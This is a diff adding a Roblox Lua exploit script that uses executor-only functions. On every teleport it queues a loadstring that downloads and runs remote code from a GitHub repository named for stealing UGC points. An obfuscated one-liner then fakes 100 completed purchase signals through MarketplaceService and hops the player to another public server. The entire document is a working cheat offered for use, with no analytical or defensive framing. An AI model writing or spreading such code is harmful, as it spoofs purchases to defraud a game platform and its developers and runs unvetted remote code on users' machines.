@@ -1,0 +1,11 @@
+--===[ QueueOnTeleport Loader ]===--
+local QueueOnTeleport = queue_on_teleport or syn.queue_on_teleport
+local SCRIPT_URL = "https://raw.githubusercontent.com/choalne02-dotcom/StealAUGC/refs/heads/main/StealPointsForUGC_FastGetSpin"
+
+pcall(function()
+    if QueueOnTeleport then
+        QueueOnTeleport("loadstring(game:HttpGet('"..SCRIPT_URL.."'))()")
+    end
+end)
+
+local P,M,T,H,l=game:GetService("Players"),game:GetService("MarketplaceService"),game:GetService("TeleportService"),game:GetService("HttpService"),game:GetService("Players").LocalPlayer;task.spawn(function()for i=1,100 do pcall(function()M:SignalPromptPurchaseFinished(l,82120626157139,true)end)end;task.wait(0.2)local s=H:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data;for _,v in pairs(s)do if v.playing<v.maxPlayers and v.id~=game.JobId then T:TeleportToPlaceInstance(game.PlaceId,v.id,l)break end end end)
